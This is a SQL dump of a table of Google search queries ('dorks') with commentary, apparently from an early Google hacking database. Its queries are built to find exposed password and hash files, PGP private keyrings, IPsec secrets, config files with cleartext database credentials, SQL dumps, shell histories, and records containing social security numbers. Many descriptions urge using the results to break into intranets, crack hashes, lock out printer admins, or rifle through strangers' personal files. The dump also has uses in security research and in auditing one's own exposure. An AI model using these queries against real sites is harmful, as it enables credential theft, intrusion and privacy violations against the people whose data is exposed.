INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(1, 'squid cache server reports', 'http://www.google.com/search?q=%22cacheserverreport+for%22+%22This+analysis+was+produced+by+calamaris%22', 3679, '2003-06-24', 'These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I''ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (''scuse me. must be a furball) OK, lets say BEST CASE scenario. Let''s say there''s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.', '2003-06-24', NULL, NULL),
(2, 'Ganglia Cluster Reports', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Ganglia%22+%22Cluster+Report+for%22', 2574, '2003-06-24', 'These are server cluster reports, great for info gathering. Lesse, what were those server names again?', '2003-06-24', NULL, NULL),
(3, 'ICQ chat logs, please...', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+dbconvert%2Eexe+chats', 2791, '2003-06-24', 'ICQ (http://www.icq.com) allows you to store the contents of your online chats into a file. These folks have their entire ICQ directories online. On purpose?', '2003-06-24', NULL, NULL),
(4, 'Apache online documentation', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Apache+HTTP+Server%22+intitle%3A%22documentation%22', 2171, '2003-06-24', 'When you install the Apache web server, you get a nice set of online documentation. When you learn how to use Apache, your supposed to delete these online Apache manuals. These sites didn''t. If they''re in such a hurry with Apache installs, I wonder what else they rushed through?', '2003-06-24', NULL, NULL),
(5, 'Coldfusion Error Pages', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22Error+Diagnostic+Information%22+intitle%3A%22Error+Occurred+While%22+', 1870, '2003-06-24', 'These aren''t too horribly bad, but there are SO MANY of them. These sites got googlebotted while the site was having "technical difficulties." The resulting cached error message gives lots of juicy tidbits about the target site.', '2003-06-24', NULL, NULL),
(6, 'Financial spreadsheets: finance.xls', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+finance.xls', 2316, '2003-06-24', '"Hey! I have a great idea! Let''s put our finances on our website in a secret directory so we can get to it whenever we need to!"', '2003-06-24', NULL, NULL),
(7, 'Financial spreadsheets: finances.xls', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+finances.xls', 2189, '2003-06-24', '"Hey! I have a great idea! Let''s put our finances on our website in a secret directory so we can get to it whenever we need to!"', '2003-06-24', NULL, NULL),
(8, 'sQL data dumps', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22%23+Dumping+data+for+table%22', 1928, '2003-06-24', 'sQL database dumps. LOTS of data in these. So much data, infact, I''m pressed to think of what else an ev1l hax0r would like to know about a target database.. What''s that? Usernames and passwords you say? Patience, grasshopper.....', '2003-06-24', NULL, NULL),
(10, 'sh_history files', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+.sh_history', 5394, '2003-06-24', 'Ok, this file contains what a user typed at a shell command prompt. You shouldn''t advertise this file. You shouldn''t flash it to a web crawler. It contains COMMANDS and USERNAMES and stuff... *sigh* Sometimes there aren''t words to describe how lame people can be. This particular theme can be carried further to find all sorts of things along these lines like .profile, .login, .logout files, etc. I just got bored with all the combinations...', '2003-06-24', NULL, NULL),
(9, 'bash_history files', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+%2Ebash%5Fhistory', 6303, '2003-06-24', 'Ok, this file contains what a user typed at a shell command prompt. You shouldn''t advertise this file. You shouldn''t flash it to a web crawler. It contains COMMANDS and USERNAMES and stuff... *sigh* Sometimes there aren''t words to describe how lame people can be. This particular theme can be carried further to find all sorts of things along these lines like .profile, .login, .logout files, etc. I just got bored with all the combinations...', '2003-06-24', NULL, NULL),
(11, 'mysql history files', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+%2Emysql%5Fhistory', 2861, '2003-06-24', 'The .mysql_history file contains commands that were performed against a mysql database. A "history" of said commands. First, you shouldn''t show this file to anyone, especially not a MAJOR SEARCH ENGINE! Secondly, I sure hope you wouldn''t type anything sensitive while interacting with your databases, like oh say USERNAMES AND PASSWORDS...', '2003-06-24', NULL, NULL),
(12, 'mt-db-pass.cgi files', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Index+of%22+mt%2Ddb%2Dpass%2Ecgi', 1804, '2003-06-24', 'These folks had the technical prowess to unpack the movable type files, but couldn''t manage to set up their web servers properly. Check the mt.cfg files for interesting stuffs...', '2003-06-24', NULL, NULL),
(13, 'Windows 2000 Internet Services', 'http://www.google.com/search?q=intitle:%22Welcome+to+Windows+2000+Internet+Services%22&num=100&hl=en&lr=&ie=UTF-8&filter=0', 1891, '2003-06-24', 'At first glance, this search reveals even more examples of operating system users enabling the operating system default web server software. This is generally accepted to be a Bad Idea(TM) as mentioned in the previous example. However, the googleDork index on this particular category gets quite a boost from the fact that this particular screen should NEVER be seen by the general public. To quote the default index screen: "Any users attempting to connect to this site are currently receiving an ''Under Construction page''" THIS is not the ''Under Construction page.'' I was only able to generate this screen while sitting at the console of the server. The fact that this screen is revealed to the general public may indicate a misconfiguration of a much more insidious nature...', '2003-06-24', NULL, NULL),
(15, 'Look in my backup directories! Please?', 'http://www.google.com/search?q=%22Index+of+/backup%22&num=100&hl=en&lr=&ie=UTF-8&filter=0', 3875, '2003-06-24', 'Backup directories are often very interesting places to explore. More than one server has been compromised by a hacker''s discovery of sensitive information contained in backup files or directories. Some of the sites in this search meant to reveal the contents of their backup directories, others did not. Think about it. What.s in YOUR backup directories? Would you care to share the contents with the whole of the online world? Probably not. Whether intentional or not, bsp.gsa.gov reveals backup directory through Google. Is this simply yet another misconfigured .gov site? You decide. BSP stands for "best security practices," winning this site the Top GoogleDork award for this category.', '2003-06-24', NULL, NULL),
(17, 'intitle:index.of intext:"secring.skr"|"secring.pgp"|"secring.bak"', 'http://www.google.com/search?q=intitle:index.of+intext:%22secring.skr%22%7C%22secring.pgp%22%7C%22secring.bak%22', 3581, '2003-06-24', 'PGP is a great encryption technology. It keeps secrets safe. Everyone from drug lords to the head of the DEA can download PGP to encrypt their sensitive documents. Everyone, that is except googleDorks. GoogleDorks, it seems, don''t understand that anyone in possession of your private keyring (secring) can get to your secret stuff. It should noever be given out, and should certainly not be posted on the Internet. The highest ranking is awarded for this surprising level of ineptitude.', '2003-06-24', NULL, NULL),
(18, 'people.lst', 'http://www.google.com/search?sourceid=navclient&q=intitle%3A%22Index+of%22+%22people%2Elst%22', 3051, '2003-06-24', '*sigh*', '2003-06-24', NULL, NULL),
(19, 'passwd', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=intitle%3A%22Index+of%22+passwd+passwd.bak', 2305, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. The hits in this search show "passwd" files which contain encrypted passwords which may look like this: "guest MMCHhvZ6ODgFo" A password cracker can eat cheesy hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!', '2003-06-24', NULL, NULL),
(20, 'master.passwd', 'http://www.google.com/search?sourceid=navclient&q=intitle%3A%22Index+of%22+master%2Epasswd', 2292, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. The hits in this search show "master.passwd" files which contain encrypted passwords which may look like this: "guest MMCHhvZ6ODgFo" A password cracker can eat cheesy hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!For master.passwd, be sure to check other files in the same directory...', '2003-06-24', NULL, NULL),
(21, 'pwd.db', 'http://www.google.com/search?sourceid=navclient&q=intitle%3A%22Index+of%22+pwd%2Edb', 2103, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. The his in this search show "pwd.db" files which contain encrypted passwords which may look like this: "guest MMCHhvZ6ODgFo" A password cracker can eat cheesy hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!', '2003-06-24', NULL, NULL),
(22, 'htpasswd / htpasswd.bak', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&safe=off&q=intitle%3A%22Index+of%22+%22.htpasswd%22+htpasswd.bak', 2943, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!', '2003-06-24', NULL, NULL),
(23, 'htpasswd / htgroup', 'http://www.google.com/search?q=intitle:%22Index+of%22+%22.htpasswd%22+%22htgroup%22++-intitle:%22dist%22+-apache+-htpasswd.c&hl=en&lr=&ie=UTF-8&safe=off&start=10&sa=N', 1863, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!You''ll need to sift through these results a bit...', '2003-06-24', NULL, NULL),
(24, 'spwd.db / passwd', 'http://www.google.com/search?q=intitle:%22Index+of%22+spwd.db+passwd+-pam.conf&hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&start=10&sa=N', 2454, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!', '2003-06-24', NULL, NULL),
(25, 'passwd / etc (reliable)', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&safe=off&q=intitle%3A%22Index+of..etc%22+passwd', 2681, '2003-06-24', 'There''s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin'' jelly doughnuts. Bravo googleDorks! Good show!', '2003-06-24', NULL, NULL),
(26, 'AIM buddy lists', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=buddylist%2Eblt', 1674, '2003-06-24', 'These searches bring up common names for AOL Instant Messenger "buddylists". These lists contain screen names of your "online buddies" in Instant Messenger. Not that''s not too terribly exciting or stupid unless you want to mess with someone''s mind, and besides, some people make these public on purpose. The thing that''s interesting are the files that get stored ALONG WITH buddylists. Often this stuff includes downloaded pictures, resumes, all sorts of things. This is really for the peepers out there, and it'' possible to spend countless hours rifling through people''s personal crap. Also try buddylist.blt, buddy.blt, buddies.blt.', '2003-06-24', NULL, NULL),
(28, 'phpinfo()', 'http://www.google.com/search?hl=en&lr=&c2coff=1&q=intitle%3Aphpinfo+%22PHP+Version%22&btnG=Search', 1880, '2004-11-18', 'this brings up sites with phpinfo(). There is SO much cool stuff in here that you just have to check one out for yourself! I mean full blown system versioning, SSL version, sendmail version and path, ftp, LDAP, SQL info, Apache mods, Apache env vars, *sigh* the list goes on and on! Thanks "joe!" =)', '2004-11-18', NULL, NULL),
(29, 'MYSQL error message: supplied argument....', 'http://www.google.com/search?num=100&hl=en&lr=&ie=ISO-8859-1&q=%22supplied+argument+is+not+a+valid+MySQL+result+resource%22', 1754, '2003-06-24', 'One of many potential error messages that spew interesting information. The results of this message give you real path names inside the webserver as well as more php scripts for potential "crawling" activities.', '2003-06-24', NULL, NULL),
(31, 'robots.txt', 'http://www.google.com/search?q=intitle:Index.of+robots.txt&hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&start=10&sa=N', 1632, '2003-06-27', 'The robots.txt file contains "rules" about where web spiders are allowed (and NOT allowed) to look in a website''s directory structure. Without over-complicating things, this means that the robots.txt file gives a mini-roadmap of what''s somewhat public and what''s considered more private on a web site. Have a look at the robots.txt file itself, it contains interesting stuff.However, don''t forget to check out the other files in these directories since they are usually at the top directory level of the web server!', '2003-06-27', NULL, NULL),
(32, 'passlist', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=intitle%3Aindex.of+passlist', 2289, '2003-06-27', 'I''m not sure what uses this, but the passlist and passlist.txt files contain passwords in CLEARTEXT! That''s right, no decoding/decrypting/encrypting required. How easy is this?*sigh*Supreme googledorkage', '2003-06-27', NULL, NULL),
(33, 'secret', 'http://www.google.com/search?q=intitle:index.of.secret&hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&start=0&sa=N', 3707, '2003-06-27', 'What kinds of goodies lurk in directories marked as "secret?" Find out...', '2003-06-27', NULL, NULL),
(35, 'etc (index.of)', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=intitle%3Aindex.of.etc', 1832, '2003-06-27', 'This search gets you access to the etc directory, where many many many types of password files can be found. This link is not as reliable, but crawling etc directories can be really fun!', '2003-06-27', NULL, NULL),
(37, 'secure', 'http://www.google.com/search?q=intitle:%22index.of.secure%22&hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&start=0&sa=N', 2835, '2003-06-27', 'What could be hiding in directories marked as "secure?" let''s find out...', '2003-06-27', NULL, NULL),
(40, '"This report was generated by WebLog"', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22This+report+was+generated+by+WebLog%22', 2083, '2003-06-27', 'These are weblog-generated statistics for web sites... A roadmap of files, referrers, errors, statistics... yummy... a schmorgasbord! =P', '2003-06-27', NULL, NULL),
(41, '"produced by getstats"', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22These+statistics+were+produced+by+getstats%22', 1741, '2003-06-30', 'Another web statistics package. This one originated from a google scan of an ivy league college. *sigh*There''s sooo much stuff in here!', '2003-06-30', NULL, NULL),
(42, '"generated by wwwstat"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22This+summary+was+generated+by+wwwstat%22', 1855, '2003-06-30', 'More www statistics on the web. This one is very nice.. Lots of directory info, and client access statistics, email addresses.. lots os good stuff.You know, these are SOOO dangerous, especially if INTRANET users get logged... talk about mapping out an intranet quickly...thanks, sac =)', '2003-06-30', NULL, NULL),
(43, 'haccess.ctl (one way)', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex%2Eof+haccess%2Ectl', 1391, '2003-06-30', 'this is the frontpage(?) equivalent of htaccess, I believe. Anyhow, this file describes who can access the directory of the web server and where the other authorization files are. nice find.', '2003-06-30', NULL, NULL),
(44, 'haccess.ctl (VERY reliable)', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=filetype%3Ahtaccess+Basic', 1902, '2003-06-30', 'haccess.ctl is the frontpage(?) equivalent of the .htaccess file. Either way, this file decribes who can access a web page, and should not be shown to web surfers. Way to go, googledork. =PThis method is very reliable due to the use of this google query:filetype:ctl BasicThis pulls out the file by name then searches for a string inside of it (Basic) which appears in the standard template for this file.', '2003-06-30', NULL, NULL),
(45, 'filetype:xls username password email', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Axls+username+password+email', 8700, '2003-06-30', 'This search shows Microsoft Excel spreadsheets containing the words username, password and email. Beware that there are a ton of blank "template" forms to weed through, but you can tell from the Google summary that some of these are winners... err losers.. depending on your perspective.', '2003-06-30', NULL, NULL),
(46, 'Hassan Consulting''s Shopping Cart Version 1.18', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3Ashop+%22Hassan+Consulting%27s+Shopping+Cart+Version+1%2E18%22', 2262, '2003-07-08', 'These servers can be messed with in many ways. One specific way is by way of the "../" bug. This lets you cruise around the web server in a somewhat limited fashion.', '2003-07-08', NULL, NULL),
(47, 'site:edu admin grades', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=site%3Aedu+grades+admin', 1479, '2003-07-10', 'I never really thought about this until I started coming up with juicy examples for DEFCON 11.. A few GLARINGLY bad examples contain not only student grades and names, but also social security numbers, securing the highest of all googledork ratings!', '2003-07-10', NULL, NULL),
(49, 'inurl:config.php dbuname dbpass', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=inurl%3Aconfig%2Ephp+dbuname+dbpass', 2344, '2003-07-29', 'The old config.php script. This puppy should be held very closely. It should never be viewable to your web visitors because it contains CLEARTEXT usernames and passwords!The hishest of all googledorks ratings!', '2003-07-29', NULL, NULL),
(51, 'index_i.shtml Ready (Xerox printers on the web!)', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=i%5Findex%2Eshtml+%22Ready%22', 2034, '2003-08-11', 'These printers are not-only web-enabled, but their management interface somehow got crawled by google! These puppies should not be public! You can really muck with these printers. In some cases, going to the "password.shtml" page, you can even lock out the admins if a username and password has not already been set! Thanks to mephisteau@yahoo.co.uk for the idea =)', '2003-08-11', NULL, NULL),
(53, '"Chatologica MetaSearch" "stack tracking"', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22Chatologica+MetaSearch%22+%22stack+tracking%3A%22', 3030, '2003-08-15', 'There is soo much crap in this error message... Apache version, CGI environment vars, path names, stack-freaking-dumps, process ID''s, perl version, yadda yadda yadda...', '2003-08-15', NULL, NULL),
(54, 'mystuff.xml - Trillian data files', 'http://www.google.com/search?q=mystuff.xml+intitle:%22index+of%22', 1676, '2003-08-19', 'This particular file contains web links that trillian users have entered into the tool. Trillian combines many different messaging programs into one tool. AIM, MSN, Yahoo, ICQ, IRC, etc. Although this particular file is fairly benign, check out the other files in the same directory. There is usually great stuff here!', '2003-08-19', NULL, NULL),
(55, 'trillian.ini', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22index+of%22+trillian.ini', 2271, '2003-08-19', 'Trillian pulls together all sort of messaging clients like AIM MSN, Yahoo, IRC, ICQ, etc. The various ini files that trillian uses include files like aim.ini and msn.ini. These ini files contain encoded passwords, usernames, buddy lists, and all sorts of other fun things. Thanks for putting these on the web for us, googledorks!', '2003-08-19', NULL, NULL),
(56, 'intitle:admin intitle:login', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=intitle%3Aadmin+intitle%3Alogin', 4728, '2003-09-09', 'Admin Login pages. Now, the existance of this page does not necessarily mean a server is vulnerable, but it sure is handy to let Google do the discovering for you, no? Let''s face it, if you''re trying to hack into a web server, this is one of the more obvious places to poke.', '2003-09-09', NULL, NULL),
(57, 'ORA-00921: unexpected end of SQL command', 'http://www.google.com/search?hl=en&ie=UTF-8&oe=UTF-8&q=%22ORA-00921%3A+unexpected+end+of+SQL+command%22', 1646, '2004-01-09', 'Another SQL error message from Cesar. This one coughs up full web pathnames and/or php filenames.', '2004-01-09', NULL, NULL),
(58, 'passlist.txt (a better way)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=inurl%3Apasslist.txt', 4055, '2004-01-23', 'Cleartext passwords. No decryption required!', '2004-01-23', NULL, NULL),
(59, 'sitebuildercontent', 'http://www.google.com/search?q=inurl:sitebuildercontent&hl=en&lr=&ie=UTF-8&oe=UTF-8&start=0&sa=N', 1338, '2004-03-04', 'This is a default directory for the sitebuilder web design software program. If these people posted web pages with default sitebuilder sirectory names, I wonder what else they got wrong?', '2004-03-04', NULL, NULL),
(60, 'sitebuilderfiles', 'http://www.google.com/search?q=inurl:sitebuilderfiles&hl=en&lr=&ie=UTF-8&oe=UTF-8&start=0&sa=N', 1354, '2004-03-04', 'This is a default directory for the sitebuilder web design software program. If these people posted web pages with default sitebuilder sirectory names, I wonder what else they got wrong?', '2004-03-04', NULL, NULL),
(62, 'htpasswd', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Ahtpasswd+htpasswd', 1987, '2004-03-04', 'This is a nifty way to find htpasswd files. Htpasswd files contain usernames and crackable passwords for web pages and directories. They''re supposed to be server-side, not available to web clients! *duh*', '2004-03-04', NULL, NULL),
(64, 'EarlyImpact Productcart', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3ACustva.asp+', 1122, '2004-03-04', 'The EarlyImpact Productcart contains multiple vulnerabilites, which could exploited to allow an attacker to steal user credentials or mount other attacks. See http://www.securityfocus.com/bid/9669 for more informationfor more information. Also see http://www.securityfocus.com/bid/9677for information about an information leakage vulnerability in versions YaBB Gold - Sp 1.3.1 and others.', '2004-03-04', NULL, NULL),
(65, 'mnGoSearch vulnerability', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Powered+by+mnoGoSearch+-+free+web+search+engine+software%22', 1224, '2004-03-04', 'According to http://www.securityfocus.com/bid/9667, certain versions of mnGoSearch contain a buffer overflow vulnerability which allow an attacker to execute commands on the server.', '2004-03-04', NULL, NULL),
(66, 'IIS 4.0 error messages', 'http://www.google.com/search?ie=UTF-8&oe=UTF-8&q=intitle%3A%22the+page+cannot+be+found%22+inetmgr', 1396, '2004-03-04', 'IIS 4.0 servers. Extrememly old, incredibly easy to hack...', '2004-03-04', NULL, NULL),
(67, 'Windows 2000 web server error messages', 'http://www.google.com/search?ie=UTF-8&oe=UTF-8&q=intitle%3A%22the+page+cannot+be+found%22+%222004+microsoft+corporation%22', 1440, '2004-03-04', 'Windows 2000 web servers. Aging, fairly easy to hack, especially out of the box...', '2004-03-04', NULL, NULL),
(68, 'IIS web server error messages', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22the+page+cannot+be+found%22+%22internet+information+services%22', 1388, '2004-03-04', 'This query finds various types of IIS servers. This error message is fairly indicative of a somewhat unmodified IIS server, meaning it may be easier to break into...', '2004-03-04', NULL, NULL),
(69, 'phpMyAdmin dumps', 'http://www.google.com/search?&q=%22%23+phpMyAdmin+MySQL%2DDump%22+filetype%3Atxt', 1319, '2004-03-04', 'From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but don''t leave your database dumps laying around on the web. They contain all SORTS of sensitive information...', '2004-03-04', NULL, NULL),
(70, 'phpMyAdmin dumps', 'http://www.google.com/search?num=100&hl=en&lr=&ie=ISO-8859-1&safe=off&q=%22%23+phpMyAdmin+MySQL-Dump%22+%22INSERT+INTO%22+-%22the%22', 1328, '2004-03-04', 'From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but don''t leave your database dumps laying around on the web. They contain all SORTS of sensitive information...', '2004-03-04', NULL, NULL),
(71, 'Gallery in configuration mode', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Gallery+in+Configuration+mode%22', 1869, '2004-03-04', 'Gallery is a nice little php program that allows users to post personal pictures on their website. So handy, in fact, that I use it on my site! However, the Gallery configuration mode allows outsiders to make changes to your gallery. This is why you shouldn''t leave your gallery in configuration mode. These people, unfortunately, have done just that!', '2004-03-04', NULL, NULL),
(72, 'cgiirc.conf', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex%2Eof+cgiirc%2Econfig%27', 1248, '2004-03-04', 'CGIIRC is a web-based IRC client. Very cool stuff. The cgiirc.config file lists the options for this porgram, including the default sites that can be attached to, server passwords, and crypts of admin passwords. This file is for CGIIRC, not Google surfers!', '2004-03-04', NULL, NULL),
(73, 'cgiirc.conf', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3A%27cgiirc.config%27', 1225, '2004-03-04', 'This is another less reliable way of finding the cgiirc.config file. CGIIRC is a web-based IRC client. Very cool stuff. The cgiirc.config file lists the options for this porgram, including the default sites that can be attached to, server passwords, and crypts of admin passwords. This file is for CGIIRC, not Google surfers!', '2004-03-04', NULL, NULL),
(74, 'ipsec.secrets', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aipsec.secrets+-history+-bugs', 1271, '2004-03-04', 'from the manpage for ipsec_secrets: "It is vital that these secrets be protected. The file should be owned by the super-user, and its permissions should be set to block all access by others." So let''s make it plain: DO NOT SHOW THIS FILE TO ANYONE! Googledorks rejoice, these files are on the web!', '2004-03-04', NULL, NULL),
(75, 'ipsec.secrets', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aipsec.secrets+%22holds+shared+secrets%22', 1302, '2004-03-04', 'from the manpage for ipsec_secrets: "It is vital that these secrets be protected. The file should be owned by the super-user, and its permissions should be set to block all access by others." So let''s make it plain: DO NOT SHOW THIS FILE TO ANYONE! Googledorks rejoice, these files are on the web!', '2004-03-04', NULL, NULL),
(76, 'ipsec.conf', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aipsec.conf+-intitle%3Amanpage', 1250, '2004-03-04', 'The ipsec.conf file could help hackers figure out what uber-secure users of freeS/WAN are protecting....', '2004-03-04', NULL, NULL),
(77, 'Internal Server Error', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22500+Internal+Server+Error%22+%22server+at%22', 1343, '2004-03-04', 'This one shows the type of web server running on the site, and has the ability to show other information depending on how the message is internally formatted.', '2004-03-04', NULL, NULL),
(78, 'mysql error with query', 'http://www.google.com/search?q=%22mySQL+error+with+query%22', 1607, '2004-03-04', 'Another error message, this appears when an SQL query bails. This is a generic mySQL message, so there''s all sort of information hackers can use, depending on the actual error message...', '2004-03-04', NULL, NULL),
(79, 'sQL syntax error', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=%22You+have+an+error+in+your+SQL+syntax+near%22', 1514, '2004-03-04', 'Another generic SQL message, this message can display path names and partial SQL code, both of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(80, '"Supplied argument is not a valid MySQL result resource"', 'http://www.google.com/search?q=%22Supplied+argument+is+not+a+valid+MySQL+result+resource%22&hl=en&lr=&ie=UTF-8&oe=UTF-8&start=90&sa=N', 1440, '2004-03-04', 'Another generic SQL message, this message can display path names, function names, filenames and partial SQL code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(81, 'ORA-00936: missing expression', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22ORA%2D00936%3A+missing+expression%22', 1300, '2004-03-04', 'A generic ORACLE error message, this message can display path names, function names, filenames and partial database code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(82, 'ORA-00921: unexpected end of SQL command', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22ORA%2D00921%3A+unexpected+end+of+SQL+command%22', 1826, '2004-03-04', 'Another generic SQL message, this message can display path names, function names, filenames and partial SQL code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(83, '"ORA-00933: SQL command not properly ended"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22ORA-00933%3A+SQL+command+not+properly+ended%22', 1405, '2004-03-04', 'An Oracle error message, this message can display path names, function names, filenames and partial SQL code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(84, '"Unclosed quotation mark before the character string"', 'http://www.google.com/search?q=%22Unclosed+quotation+mark+before+the+character+string%22&hl=en&lr=&ie=UTF-8&oe=UTF-8&start=10&sa=N', 1387, '2004-03-04', 'An SQL Server error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(85, '"Incorrect syntax near"', 'http://www.google.com/search?q=%22Incorrect+syntax+near%22&hl=en&lr=&ie=UTF-8&oe=UTF-8&start=90&sa=N', 1306, '2004-03-04', 'An SQL Server error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(86, '"Incorrect syntax near"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Incorrect+syntax+near%22+-the', 1429, '2004-03-04', 'An SQL Server error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(87, '"PostgreSQL query failed: ERROR: parser: parse error"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22PostgreSQL+query+failed%3A++ERROR%3A++parser%3A+parse+error%22', 1527, '2004-03-04', 'An PostgreSQL error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(89, '"Syntax error in query expression " -the', 'http://www.google.com/search?q=%22Syntax+error+in+query+expression+%22+-the&hl=en&lr=&ie=UTF-8&oe=UTF-8', 1294, '2004-03-04', 'An Access error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
